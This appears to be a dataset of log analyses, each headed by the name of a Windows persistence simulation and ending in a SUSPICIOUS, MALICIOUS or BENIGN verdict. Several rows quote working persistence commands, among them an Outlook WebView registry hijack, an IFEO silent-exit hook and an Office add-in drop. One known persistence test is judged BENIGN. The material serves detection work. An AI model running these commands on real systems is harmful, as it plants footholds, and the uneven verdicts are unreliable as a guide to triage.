HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"Upon analyzing the provided Windows event logs, several observations can be made:

### Suspicious Behavior:

1. **PowerShell Execution:**
   - A PowerShell command was executed with the intent to modify the Windows Registry path `HKLM:\Software\Microsoft\Command Processor` to set an AutoRun key value to `notepad.exe`. This can be a part of a persistence mechanism, commonly used in malicious activities to ensure execution upon system start-up.

2. **Sysmon Logs Anomalies:**
   - In the Sysmon logs, a series of process creations around the same timestamp indicate a burst of activity that includes PowerShell, svchost.exe, and EdgeUpdate processes. The usage of whoami.exe and hostname.exe appears benign but their execution contexts could depend on other factors (since these tools are often used for reconnaissance or in scripts).

3. **Time Manipulation:**
   - System EventID 1 and Security EventID 4616 indicate that the system time was reverted, which can be an indicator of malicious behavior. Time manipulation may be performed by attackers to avoid detection or alter logs.

### Potential Malicious Activities:

- The PowerShell command modifying the registry is the most significant indicator of potential compromise, as it's outside typical behavior for a standard user operation.
- Time manipulation and excessive system process activity, when combined with the PowerShell activity, suggest potential tampering or an attempt to bypass normal logging and investigation.

### Assessment:

Based on the observed behaviors, especially the PowerShell registry modification, there are signs of potential compromise, specifically targeting persistence mechanisms. The time change and command executions raise additional suspicions.

### Resolution:

**Resolution: SUSPICIOUS**

- The log activities contain behavior that is out of the ordinary and indicative of potential nefarious actions, thus requiring further investigation to confirm any malicious intent or false positives.

### Guidance:

1. **Immediate Actions:**
   - Conduct a comprehensive review of the system for unauthorized registry changes using tools like Autoruns or Regedit.
   - Check for any subsequent activities or anomalies that follow the PowerShell command in logs beyond what has been provided.
  
2. **Further Investigation:**
   - Examine the context of PowerShell activity by reviewing user permissions and logs surrounding the time window.
   - Assess recent installations or updates that may coincide with the PowerShell activity to rule out a benign software update using these commands legitimately.

3. **Mitigation and Monitoring:**
   - Implement tighter access controls and logging policies for PowerShell, potentially enabling Script Block Logging and Module Logging for better insights.
   - Reconfigure or secure the affected system to prevent AutoRun executions.
   - Monitor systems continuously for unusual process spawning and registry modifications and new PowerShell activities.

By proceeding with these steps, any ongoing or persistent threats can be potentially mitigated, and the root cause of these anomalies can be further investigated."
Change Default File Association,"After a detailed analysis of the available Sysmon logs, several observations can be made:

1. **Frequent Execution of System Utilities:**
   - There are multiple instances of system utilities like `whoami.exe`, `conhost.exe`, and `wevtutil.exe` being executed, often in rapid succession and with the user identified as `SERVER002\admin_test`. While occasional usage of these commands can be normal for administrative purposes, their frequent execution can also be a hint of an attempt to gather information or manipulate logs.
   
2. **Use of `cmd.exe` with Suspicious Command:**
   - A `cmd.exe` process was executed with the command `assoc .hta=txtfile`. This command changes the file association for `.hta` files to open as text files, potentially to evade execution if `.hta` files are used for malicious scripting.
   
3. **Repeated Microsoft Edge Update Processes:**
   - A significant number of events are related to `MicrosoftEdgeUpdate.exe`. While updates for Microsoft Edge are routine, the volume of activity related to this executable, including multiple executions and interactions with other components, is abnormal. Additionally, some instances show execution from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU649C.tmp\\`), which can be suspicious, as legitimate installations usually run from standard program directories.

4. **Process Executed from Temporary Directory:**
   - Microsoft Edge Update executables (`MicrosoftEdgeUpdate.exe`, `setup.exe`) were executed from a temporary path, characterized by a directory like `C:\\Program Files (x86)\\Microsoft\\Temp\\EU649C.tmp\\`. Running executables from temporary directories can often be associated with malware trying to evade detection by residing in less scrutinized parts of the file system.

5. **Administrative and System-Level Activities:**
   - Many processes were executed with `SYSTEM` level privileges or by an administrative user (`SERVER002\admin_test`). This level of access could be indicative of administrative maintenance activities but, if not verified as legitimate work, could also be a sign of privilege escalation or lateral movement attempts by an adversary.

**Assessment of the Situation:**
Given the indicators, especially the execution of system utilities, the modification of file associations through command line, and the execution of Edge update processes from temporary directories, there are several indications of potentially suspicious activities. However, without additional context, such as business operations or details on recent software changes, these actions are not definitively malicious but warrant further investigation.

**Threats or Risks Identified:**
- Potential data gathering using utilities like `whoami.exe` and `wevtutil.exe`.
- Possible tampering with file associations to hide malicious activity.
- Unusual activity patterns of Microsoft Edge updates suggesting possible misuse or exploitation of legitimate processes.

**Guidance on How to Proceed:**
- Verify the legitimacy of `SERVER002\admin_test` user's recent activities and intent through direct communication.
- Investigate the reason and necessity of command-line association change for `.hta` files.
- Review the system for any unauthorized or unexpected changes made via `conhost.exe`, `whoami.exe`, or `wevtutil.exe`.
- Ensure that observed Microsoft Edge update activities align with known legitimate updates, and confirm the integrity of files by checking hashes against trusted sources.
- Monitor closely for further signs of lateral movement or unauthorized privileges escalation.

**Resolution: SUSPICIOUS** 
This categorization is due to notable but not conclusively malicious activities that require further investigation to articulate whether there's a potential security compromise."
Install Outlook Home Page Persistence,"Upon reviewing the provided Windows event logs for the investigation, several findings stand out which warrant further analysis. Here's a detailed overview:

### Analysis of Logs:

1. **Time Synchronization Events:**
   - The **System** and **Security** logs show multiple **time synchronization** events. Windows typically logs time changes, which could be either manual changes or automatic synchronization with a time server (EventID 4616 in Security and EventID 1 in System). All changes are attributed to the ""LOCAL SERVICE"" account, associating with typical system behavior, not raising immediate concern.

2. **Process Execution:**
   - The **Sysmon** logs indicate the execution of several typical system processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and the `cmd.exe`. 
   - The appearance of `cmd.exe` running a command involving the modification of the registry (adding a URL under the Outlook WebView path) is more suspicious in nature. This kind of operation can be an indicator of potentially unwanted behavior, such as attempts to persist within the system or to modify system configuration, often used by attackers to craft phishing messages or a method for malware delivery.

3. **Registry Modification:**
   - The specific command run by `cmd.exe`: 
     ```
     ""cmd.exe"" /c reg.exe add HKCU\Software\Microsoft\Office\16\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\data.004.html /f
     ```
     This indicates an attempt to modify the registry to add URLs to the Outlook WebView, which could be malicious. It points towards potential exploitation or preparation for executing unwanted scripts through Outlook.

4. **Process Associations:**
   - Parent-child process relationships in Sysmon logs show `cmd.exe` was executed by `wsmprovhost.exe`, a legitimate process generally used for hosting Windows PowerShell sessions. However, its use as a parent process for command execution could be seen in living-off-the-land binary (LOLBin) attack techniques.

5. **Integrity Level:**
   - Various processes have executed with **High Integrity Level**, which indicates operations requiring elevated privileges. This alone isn't alarming without other suspicious contexts but is worth noting as it shows the user 'SERVER002\admin_test' has significant system access.

6. **Absence of Detailed PowerShell Logs:**
   - There are no logs from the **Windows PowerShell** log, and no relevant entries in the **Application log**, meaning either that execution wasn’t captured correctly or operations did not invoke PowerShell.

### Assessment and Resolution:

**Resolution: SUSPICIOUS**

Though many of the logged activities could be explained as normal system operations or administrative tasks, the registry modification attempted by `cmd.exe` coupled with its parent `wsmprovhost.exe` through command-line arguments is unusual for benign activities in a corporate or executive environment. This specific sequence suggests potentially nefarious activity either as a misconfiguration or an intrusion/attack prepping mechanism.

### Recommendations:
- **Immediate Response:**
  - Conduct a detailed review of ongoing tasks and scheduled tasks on the machine.
  - Verify the source and legitimacy of any URL in the modified registry path.
  - Inspect the `data.004.html` file within the path for any scripted content that may be malicious.
  - Ensure antivirus and endpoint protection tools are up to date and run comprehensive scans.

- **Further Investigation:**
  - Confirm user intent by identifying actions admin_test undertook around the suspected event times.
  - Cross-reference network logs to ensure no other outbound connectivity attempts to external hosts were made around this timeline.

- **Preventive Measures:**
  - Strengthen alert mechanisms for similar process sequences and suspicious registry changes.
  - Regularly update monitoring to capture command line arguments and potential lateral movements.

Given the logs reviewed and suspicious characteristics noted, further investigation into the archival setup of both the user and the system's recent activities is warranted to ensure any potential threats are promptly identified and mitigated."
GlobalFlags in Image File Execution Options,"### Analysis of the Event Logs:

Upon analyzing the provided event logs, the following observations and suspicious activities were detected:

#### 1. **Suspicious PowerShell Activity:**
- **PowerShell Execution:** There is a PowerShell script that modifies registry settings related to Image File Execution Options (IFEO) for the `whoami.exe` process. This registry path is commonly misused by attackers for debugging and monitoring execution of processes as a persistence mechanism or in process hijacking attacks.

- **Payload with `cmd.exe /c calc.exe`:** The script further configures a ""Silent Process Exit"" monitor with `cmd.exe /c calc.exe`, meaning when `whoami.exe` is executed, this will instead trigger `calc.exe`, which is typically a technique used to verify successful hijacking or process manipulation.

#### 2. **Registry Modification:**
- The registry modifications apply ""GlobalFlag"" and ""ReportingMode"" settings to `whoami.exe`. Alterations to these settings without clear, benign intent can indicate attempts to establish persistence or prepare for a more complex attack.

#### 3. **Timing and Context:**
- The logs demonstrate a sudden burst of PowerShell activity focused on registry changes, concurrent with the execution of native Windows processes (`whoami.exe` and `svchost.exe`) in close succession without any legitimate user-facing tasks like software updates or legitimate admin tasks.

#### 4. **Integrity Level and User:**
- All these processes are executed under the `SERVER002\admin_test` user context with `High` integrity level, suggesting elevated privileges, which are not typically required for benign user activities or routine administrative tasks.

### Assessment

Given these findings, the event logs suggest potentially malicious activity characterized by:
- **Misuse of PowerShell to modify critical registry settings.**
- **Attempt to hijack `whoami.exe` behavior using the IFEO mechanism.**
- **Triggered execution of innocuous appearing processes (e.g., `calc.exe`) as a potential evasion test or placeholder for a future payload.**

### Resolution

- **MALICIOUS:** The pattern of PowerShell usage, registry edits, and intended execution of unexpected processes strongly indicates malicious activity, potentially as part of a penetration test or unauthorized access attempt.

### Guidance

1. **Immediate Steps:**
   - **Isolate the Affected Host:** Disconnect the server from the network to prevent potential spread or data exfiltration.
   - **Analyze System Snapshots:** Check for additional signs of tampering or malware, especially in the context of user `admin_test`.

2. **Forensic Investigation:**
   - Conduct a deeper forensic analysis to identify any additional changes made and determine the full scope of this incident.
   - Review network logs for suspicious outbound connections or data transfers.

3. **Remediation:**
   - Clean/Restore the system using a backup or reinstall to ensure no malicious changes persist.
   - Implement enhanced monitoring and logging on critical systems to detect similar activities quickly in the future.

4. **Security Hardening:**
   - Conduct a security audit and apply stricter policies on PowerShell usage and registry modifications.
   - Ensure least-privilege access controls are enforced for all user accounts.

Taking the described actions will help contain the potential threat, mitigate risks, and prevent future incidents of a similar nature."
Office Application Startup Test Persistence (HKCU),"Let's analyze the given logs to identify any indicators of suspicious or malicious activity.

### Windows PowerShell Logs:

The PowerShell logs consistently mention a script that involves the creation of a `COMObject` for `Word.Application`. The script checks whether the `Word` application is installed in `Program Files (x86)` suggesting it tries to determine if `Office` is 64-bit or 32-bit. It then attempts to add registry entries under `HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf` pointing to DLL files located in a temporary directory, followed by stopping and starting the `WinWord` process.

- **Suspicious Behavior Observed**: 
  - **Registry modification**: The script writes to the registry to add entries that point to executable DLL files stored in a temporary location. This behavior is commonly seen in attempts to introduce persistence mechanisms by malware.
  - **Stopping and Starting Process**: Stopping and starting `WinWord` could be an attempt to ensure that the modified DLL gets loaded by the application, which might indicate an attempt to manipulate the `Word` process.
  - **Execution of potentially harmful commands**: The dynamic creation and execution of Office-related DLLs from unexpected directories often signify malicious intent, particularly if those DLLs are not standard Office components.

### Sysmon Logs:

The Sysmon log events corroborate the PowerShell activities, specifically the execution of `powershell.exe` with a suspicious command line argument, consistent with the script detailed in the PowerShell logs.

- **Evidence of Process Creation**:
  - Events related to `conhost.exe`, `wevtutil.exe`, and `whoami.exe` run by the user `SERVER002\\admin_test`. These seem to stem from the PowerShell script execution context or for gathering system information, potentially revealing reconnaissance activity.
  - Execution of `whoami.exe` and `hostname.exe`, potentially indicative of privilege validation or environment reconnaissance, often precede further malicious operations.
  - The correlation of Sysmon events for process executions and the timing of PowerShell execution establishes that these activities are linked.

### Overall Conclusion:

The identified behaviors, especially relating to registry manipulations, DLL injections from non-secure locations, and the pattern of executed commands, point towards potential malicious activity aimed at compromising or persisting within the system.

### Final Resolution: **MALICIOUS**

Given the evidence of system registry modifications to load non-standard DLLs in a suspicious manner, this activity indicates a high likelihood of malicious intent, merit further immediate investigation and possibly, an incident response. Here’s how you should proceed:

- **Immediate Action**: Isolate the affected system (`Server002`) to prevent further potentially malicious activity.
- **Further Investigation**:
  - Analyze the `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\officetest_x64.dll` and `officetest_x86.dll` for potential payload or backdoor.
  - Review the `EDR` log alerts and gather any potentially linked event data for corroborative evidence.
- **Validation**: Conduct a thorough system scan using a reputable antivirus and anti-malware suite.
- **Remediation**: Depending on findings, consider cleaning the registry entries, removing the malicious DLLs, and performing updates or reinstalls of potentially compromised applications.

By taking these steps, you mitigate the detected risk and potentially uncover any broader implications or infections in your network environment."
Install IIS Module using AppCmd.exe,"Upon a detailed review of the provided Windows event logs, several patterns and entries can be noted. These logs include entries from the Application, Sysmon, and some command executions via PowerShell and Command Prompt.

### Analysis:

1. **Sysmon Events and Edge Updates**:
   - **MicrosoftEdgeUpdate.exe**: The logs show frequent executions of `MicrosoftEdgeUpdate.exe` throughout the timestamped entries. The process is launched multiple times with different command-line arguments, common for update operations.
   - **Command Line and Parent Process Information**: The command lines contain typical update parameters such as `/svc` and `/c`. The parent processes are consistently `MicrosoftEdgeUpdate.exe`, indicating a potentially benign update process.

2. **Suspicious Cmd and Conhost Usage**:
   - **CMD Activity**: There is a suspicious command execution logged that involves the `cmd.exe` process installing a module using `appcmd.exe install module /name:DefaultDocumentModule_file`. This installation from a temporary user context directory is generally unusual and often considered suspicious if not part of regular maintenance or updates.
   - **Conhost Instances**: Multiple instances of `conhost.exe` appear, which is a component of Windows Console Host. The number of instances observed and associations with `cmd.exe` and other processes might signal script executions, although not inherently malicious.

3. **User and Authority Context**:
   - The operations occur under the `NT AUTHORITY\SYSTEM` context, which implies high integrity level execution, typical for updates and system-level operations.

4. **Edge and SPP Service Logs**:
   - The application log indicates stopping of the `edgeupdate` service twice. While suspicious if frequent without cause, this may relate to normal update processes.
   - **Microsoft-Windows-Security-SPP**: The `sppsvc.exe` appears once, which is a part of the Software Protection Platform Service. This could be part of standard operations or licenses checks.

### Conclusion:
- The observed pattern, including repeated Edge Update operations and command-line executions, aligns closely with a robust update mechanism, which includes frequent service stops and command executions. However, the installation via `cmd.exe` seems peculiar and warrants further scrutiny.

### Guidance and Resolution:
- **Resolution**: **SUSPICIOUS** – The repeated execution of update processes alongside `cmd.exe` installing modules could be benign if within an expected update operation scope. It would be crucial to verify if these operations are fitting within the usual IT management schedule or a legitimate update process.
- **Immediate Actions**:
  - Investigate the `cmd.exe` and `conhost.exe` activity's origin and authorization.
  - Cross-reference with known maintenance schedules or update windows.
  - Validate signatures and hashes of involved binaries to ensure they match expected values.
  - Consider setting more granular monitoring for similar `cmd.exe` executions to capture any deviation in legitimate activity.

Further investigation is necessary to ensure these activities align with legitimate administrative tasks or expected update processes."
Attaches Command Prompt as a Debugger to a List of Target Processes,"Considering the logs provided, I have conducted a detailed analysis of the various event logs, notably from the Security, Application, Sysmon, Windows PowerShell, and System logs. There are a few key observations and evaluations below:

### Suspicious or Anomalous Behavior:

1. **Privilege Escalation Indicators:**
   - **Security Log [EventID 4672]:** The SYSTEM user has been granted a broad range of privileges (SeDebugPrivilege, SeTcbPrivilege, etc.). While SYSTEM level access is normal, the acquisition of multiple high-level privileges can be of concern if it is followed by suspicious processes or actions, as it can be used for unauthorized system modifications or data exfiltration.

2. **Potential Malicious Use of PowerShell:**
   - **Sysmon Log and Windows PowerShell Log:** There are indications of PowerShell scripting with an attempt to modify the Image File Execution Options registry keys, setting a debugger (cmd.exe) for accessibility tools (osk.exe, sethc.exe, etc.). This could potentially be used for unauthorized system access or privilege escalation, known in security contexts as an ""accessibility feature"" exploit method. Commands like these should be further investigated for malicious intent.

3. **Unusual Process Executions:**
   - **Sysmon Log:** Multiple instances of `wevtutil.exe` and other command-line utilities executed with involvement of `admin_test` user account.
   - **Process Creation [EventID 1]:** Multiple entries of process creations with administrative privileges involving potentially suspicious command lines, especially with wevtutil which might be involved in exporting or clearing event logs.

### Indicators of Compromise or Malicious Activity:

- The PowerShell script execution and potentially alarming command-line executions suggest attempts to establish persistence or pivot attacks through backdoor entry techniques.
- The registry modifications via PowerShell are strongly indicative of an effort to use system processes for unauthorized command prompt access—this is a known tactic amongst certain malware and attackers to maintain persistence or escalate privileges.

### Final Assessment:

Given the detailed analysis above, the activity is determined as quite suspicious due to the use of system tools and privileges to potentially achieve persistence and stealth access:

- **Resolution: SUSPICIOUS**

This resolution indicates that while there is no definitive evidence of compromise, there are clear signs of operations that warrant further investigation. Steps forward should include:

- **Immediate Steps:**
  - Alert team members and stakeholders about the potential threat.
  - Conduct a thorough check of additional logs around the same timeframe for unusual activities.

- **Recommended Actions:**
  - Isolate any systems potentially affected, especially those associated with the IP and machine names.
  - Perform a detailed forensic analysis on systems flagged in the logs to ensure there's no active threat or malware.
  - Revise the registry settings modified through PowerShell to prevent unauthorized access through accessibility applications.
  - Review access logs and network traffic around the timeframe in question for further anomalies.
  
By undertaking these steps and keeping lines of communication open with all affected parties, the suspicion can be confirmed or ruled out with appropriate measures taken."
Azure AD - Create a new user,"After thoroughly analyzing the log entries provided, several indicators point towards suspicious and potentially malicious activities happening on the host. Here are the key observations:

1. **PowerShell Activity**: There is a series of PowerShell commands executed as seen in the Sysmon and Windows PowerShell logs. The command involves connecting to Azure Active Directory (`Connect-AzureAD`) and creating a new user (`New-AzureADUser`). This operation is highly suspicious because it involves creating a new account with a long credential that seems randomly generated, which is atypical for legitimate user creation.

2. **Privileged Processes and Services**: The Sysmon logs indicate numerous process creations related to critical system executables like `svchost.exe`, `taskhostw.exe`, and other processes such as `wevtutil.exe`. The `wevtutil.exe` process, which interacts with event logs, was spawned multiple times by the same user (`admin_test`), suggesting possible attempts at cover tracks or manipulation of event logs.

3. **Security Logs and Privileges**: The Security logs show successful logon events (`4624`) indicating logons with high privilege tokens (`4672`). The privileges listed include `SeDebugPrivilege`, `SeAuditPrivilege`, among others, which allow a process to debug and audit other processes. The presence of these privileges, especially during the suspicious PowerShell activity, raises a red flag indicating potential lateral movement or privilege escalation.

4. **Software Protection Platform Service Actions**: The logs capture actions involving the Software Protection Platform Service, which isn't uncommon. However, without additional context or unusual activity elsewhere correlating with this, these logs stand benign on their own.

5. **Failed Credential Access**: There are multiple `5379` events indicating failed credential accesses. The repeated attempts access credentials associated with a Microsoft Account (`02txoixylodcstop`) associate potentially unauthorized activities.

### Assessment:
- **Suspicious PowerShell Activity**: Creating a user account in Azure AD with a PowerShell script is unusual and points toward potential preparatory steps for data exfiltration or persistence.
- **Excessive Privileges During Logons**: Multiple events of high privilege tokens without clear maintenance or administrative tasks signify potential privilege abuse.
- **Event Log Manipulation Attempts**: Using `wevtutil.exe` could indicate attempts to manipulate or clear event logs to hide traces, common in malicious activities.

### Conclusion:
- Based on the evidence, the behavior observed in the logs appears to be **MALICIOUS**. The signs of scripting in sensitive environments with wide privileges and potential event log tampering are strong indicators of a security incident.

### Guidance:
- Immediate incident response actions should be initiated, including:
  1. Isolate the host to prevent further potential harm.
  2. Review Azure AD for newly created accounts and unexpected modifications.
  3. Analyze associated network activities for data exfiltration or unauthorized external communications.
  4. Escalate to threat-hunting teams for comprehensive forensic analysis to confirm initial findings and scope of compromise.
  5. Initiate communication with IT support to secure and evaluate other systems for similar patterns. 

These actions will help contain and mitigate the threat before any potential escalation."
Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"**Detailed Analysis of Logs:**

Upon examining the logs provided, certain entries require closer attention:

1. **Windows PowerShell Logs:**
   - A PowerShell command has been executed: 
     ```
     powershell.exe & {Copy \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\Addins\\PptVBAaddin.ppam\"" \""$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\""\r\n
     ```
     This command involves copying a file from a temporary directory to the user's APPDATA location and manipulating the registry for PowerPoint add-ins. This activity can be consistent with creating a malicious macro in PowerPoint that executes with PowerPoint startup.

   - There is an error during the operation as indicated by an exception:
     ```
     Attempting to perform the CopyItem operation on the 'FileSystem' provider failed for path 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\Addins\\PptVBAaddin.ppam'. Could not find a part of the path 'C:\\Users\\admin_test\\AppData\\Roaming\\Microsoft\\Addins\\notepad.ppam'.
     ```
     This suggests that the operation failed due to the non-existence of the file or the directory it was supposed to copy to.

2. **Sysmon Logs:**
   - Multiple consecutive process creations for known administrator tools (e.g., `hostname.exe`, `whoami.exe`, `powershell.exe`, and `conhost.exe`) executed by `SERVER002\\admin_test` user, potentially as part of a script or scheduled task.

   - The PowerShell command logged aligns with an attempt to tamper with Microsoft Office through an add-in, suggesting an attempt to persist malicious code or leverage office automation vulnerabilities.

3. **Edge Update Service:**
   - Windows Edge Update processes are executing with `/update`, `/svc`, `/regsvc`, etc., which are typically standard update operations. However, due to the obfuscation potential in the PowerShell script and the proximity to the PowerShell command, these should be monitored closely for abuse.

**Assessment:**
- **Suspicious/Potential Threat:** The command hosted in PowerShell operations implies an attempt to manipulate Microsoft Office add-ins which could be a vector for persistence or further exploitation if the script were corrected and executed successfully. Although no execution was fully successful (as indicated by the error message), the intention is evident and confirms suspicious activity.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct a thorough examination of the user's activities, focusing on the account `SERVER002\\admin_test`.
- Investigate for any unusual Office application behaviors, particularly around add-ins.
- Ensure that access to critical paths and registry entries are logged and audited.
- Verify if modifications have been made to autorun macros or add-ins in the Office applications.
- Isolate the host to prevent any further potential compromise until a detailed investigation is complete.
- Develop an incident response plan to handle potential malicious persistence and exploitation attempts in user profiles, especially around Office suite applications."
Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,"### Analysis of Windows Event Logs

#### Summary:
The logs provided showcase multiple PowerShell events, application events related to Microsoft Edge updates, Sysmon events indicating process creation logs, and insufficient data from the Security and System logs. The primary focus should be on identifying abnormal or malicious behavior, especially around processes that have the potential to modify system configurations or execute unauthorized tasks.

#### Findings:

1. **PowerShell Execution:**
   - Several PowerShell logs indicate the execution of a command to register a new web global module (`New-WebGlobalModule -Name DefaultDocumentModule_file -Image %windir%\system32\inetsrv\defdoc.dll`). This is a legitimate PowerShell activity but could be used for persistence if executed by an attacker. Given the event context, it seems this was part of an administrative task, and there are no other signs (e.g., suspicious script names or outbound communication attempts) that this instance is malicious.

2. **Sysmon Events:**
   - The logs contain multiple instances of common Windows binaries such as `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe`. These seem to indicate routine administrative tasks or script execution and not necessarily malicious activity.
   - The process execution activities related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) are consistent with legitimate software update processes. The presence of system-authority-level permissions and processes run under `NT AUTHORITY\SYSTEM` supports this conclusion.

3. **Microsoft Edge Update Activities:**
   - Several application logs and Sysmon entries related to Microsoft Edge updates indicate routine update procedures. This includes processes invoking EdgeUpdate executables with flags for updating and registering services, which appear routine for software maintenance tasks.

4. **Indicators of Anomalous or Malicious Activity:**
   - All processes observed are consistent with known, benign Windows or Microsoft processes, with no indications of known malicious hashes or unrecognized command line arguments.
   - No privilege escalation, unusual user accounts, or external communications were detected within the provided logs.

#### Conclusion:
Based on the review of the event logs provided, there is no evidence of malicious activity. The activities logged, such as PowerShell executions and EdgeUpdates, are consistent with routine system maintenance and update procedures. The lack of indicators such as unusual process executions, failed login attempts, unauthorized privilege escalations, or network connections, further corroborates this conclusion.

**Resolution: BENIGN** - The logs reviewed show benign activities with no signs indicative of malicious intent or system compromise.

#### Guidance:
- **Monitor** the system regularly for any deviations from expected behavior, particularly in terms of new or modified scripts, services, or persistence mechanisms.
- **Implement stricter auditing** and logging, especially around remote or administrative PowerShell executions.
- Maintain regular **updates and security patches** to minimize vulnerabilities exploited by advanced persistent threats (APTs).
- Ensure all processes with elevated privileges, like those running under the `NT AUTHORITY\SYSTEM`, are part of expected workloads, especially in a high-target environment like that of a CEO's workstation."
